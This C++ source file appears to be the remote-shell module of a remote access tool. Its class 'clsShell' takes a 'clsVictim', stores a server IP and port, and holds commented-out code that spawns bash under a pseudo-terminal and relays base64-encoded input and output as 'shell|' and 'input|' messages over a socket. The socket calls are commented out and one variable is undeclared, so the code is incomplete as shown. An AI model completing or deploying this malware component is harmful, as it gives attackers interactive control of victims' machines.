#include <iostream>
#include <string>
#include <vector>
#include <unistd.h>
#include <pty.h>
#include <thread>
#include <termio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include "clsEZData.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"

class clsShell
{
private:
    clsVictim m_victim;
    int m_nMasterFd;

    std::string szSrvIP;
    int nSrvPort;

public:
    clsShell(clsVictim victim)
    {
        m_victim = victim;
    }

    void fnStart()
    {
        /*
        int master_fd;
        pid_t pid = forkpty(&master_fd, nullptr, nullptr, nullptr);
        if (pid == 0) {
            execl("/bin/bash", "/bin/bash", nullptr);
            perror("execl failed");
            return;
        }

        // make master non-blocking
        fcntl(master_fd, F_SETFL, O_NONBLOCK);
        // make sock blocking for simplicity on recv
        // start threads:
        std::thread outputThread([&](){
            char buf[4096];
            while (true) {
                ssize_t n = read(master_fd, buf, sizeof(buf));
                if (n > 0) {
                    std::string b64 = clsEZData::fnb64EncodeUtf8(buf);
                    std::string msg = "shell|" + b64 + "\n";
                    //send(sock, msg.c_str(), msg.size(), 0);
                }
                usleep(5000);
            }
        });

        std::thread recvThread([&](){
            std::string acc;
            char buf[4096];
            while (true) {
                //ssize_t r = recv(sock, buf, sizeof(buf), 0);


                if (r <= 0) { usleep(1000); continue; }
                acc.append(buf, buf + r);
                while (true) {
                    size_t pos = acc.find('\n');
                    if (pos == std::string::npos) break;
                    std::string line = acc.substr(0, pos);
                    acc.erase(0, pos + 1);
                    if (line.rfind("input|", 0) == 0) {
                        std::string b64 = line.substr(6);
                        std::string decoded = clsEZData::fnb64DecodeUtf8(b64);
                        if (!decoded.empty()) {
                            write(master_fd, decoded.data(), decoded.size());
                        }
                    }
                }
            }
        });

        outputThread.join();
        recvThread.join();

        */
    }

    ~clsShell() = default;
};
